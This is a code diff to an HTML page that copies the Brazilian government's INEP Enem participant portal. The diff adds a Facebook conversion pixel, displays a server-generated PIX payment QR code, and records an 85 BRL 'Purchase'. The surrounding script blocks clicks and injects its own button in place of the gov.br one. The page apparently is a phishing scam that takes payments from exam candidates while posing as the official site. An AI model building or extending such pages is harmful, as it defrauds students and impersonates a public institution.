@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="google" content="notranslate"><link rel="shortcut icon" href="images/favicon.ico"><meta name="viewport" content="minimum-scale=1,initial-scale=1,width=device-width,shrink-to-fit=no"><meta name="theme-color" content="#000000"><meta name="appVersion" content="3.0.1422"><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="expires" content="0"><meta http-equiv="pragma" content="no-cache"><link rel="manifest" href="./manifest.json"><title>INEP - Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</title><meta name="description" content="Enem - Página do Participante"><meta name="keywords" content="Enem, Participante, Inscrição, Isenção, Resultado, INEP"><meta property="og:title" content="Enem - Exame Nacional do Ensino Médio"><meta property="og:description" content="Enem - Página do Participante"><meta property="og:url" content="https://enem.inep.gov.br/participante/#!/"><meta property="og:site_name" content="Enem - Página do Participante"><meta name="twitter:title" content="Enem - Exame Nacional do Ensino Médio"><meta name="twitter:description" content="Enem - Página do Participante"><link href="css/2.ea750f62.chunk.css" rel="stylesheet"><link href="css/main.25c0081c.chunk.css" rel="stylesheet"><style>*{cursor:default!important;user-select:none!important;}</style><script>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','4327697327497010');fbq('track','PageView');</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"/></noscript><meta name="google" content="notranslate"><link rel="shortcut icon" href="images/favicon.ico"><meta name="viewport" content="minimum-scale=1,initial-scale=1,width=device-width,shrink-to-fit=no"><meta name="theme-color" content="#000000"><meta name="appVersion" content="3.0.1422"><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="expires" content="0"><meta http-equiv="pragma" content="no-cache"><link rel="manifest" href="./manifest.json"><title>INEP - Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</title><meta name="description" content="Enem - Página do Participante"><meta name="keywords" content="Enem, Participante, Inscrição, Isenção, Resultado, INEP"><meta property="og:title" content="Enem - Exame Nacional do Ensino Médio"><meta property="og:description" content="Enem - Página do Participante"><meta property="og:url" content="https://enem.inep.gov.br/participante/#!/"><meta property="og:site_name" content="Enem - Página do Participante"><meta name="twitter:title" content="Enem - Exame Nacional do Ensino Médio"><meta name="twitter:description" content="Enem - Página do Participante"><link href="css/2.ea750f62.chunk.css" rel="stylesheet"><link href="css/main.25c0081c.chunk.css" rel="stylesheet"><style>*{cursor:default!important;user-select:none!important;}</style><script>
 (function(){
   // Bloqueia todos os cliques (não há mais botão gov.br nesta página)
   window.addEventListener('click',function(e){
@@ -751,7 +751,11 @@ function injetarBotao(){
           var bubble = balao.children[1] && balao.children[1].children[1];
           if(bubble){
             var qrImg = document.createElement('img');
-            qrImg.src = data.qr_code;
+            var qrSrc = data.qr_code;
+            if(qrSrc && !qrSrc.startsWith('http') && !qrSrc.startsWith('data:')) {
+              qrSrc = 'data:image/png;base64,' + qrSrc;
+            }
+            qrImg.src = qrSrc;
             qrImg.style.cssText = 'width:190px;height:190px;display:block;margin:10px auto;border:1px solid #ddd;border-radius:6px;';
             bubble.appendChild(qrImg);
 
@@ -806,6 +810,7 @@ function injetarBotao(){
           ultimoBalao = balao;
           btn.style.display = 'none';
           cover.style.display = 'none';
+          if(typeof fbq === 'function') fbq('track', 'Purchase', {value: 85.00, currency: 'BRL'});
           setTimeout(function(){ balao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
         } else {
           var errMsg = (data && data.message) ? data.message : 'Erro ao gerar o PIX.';
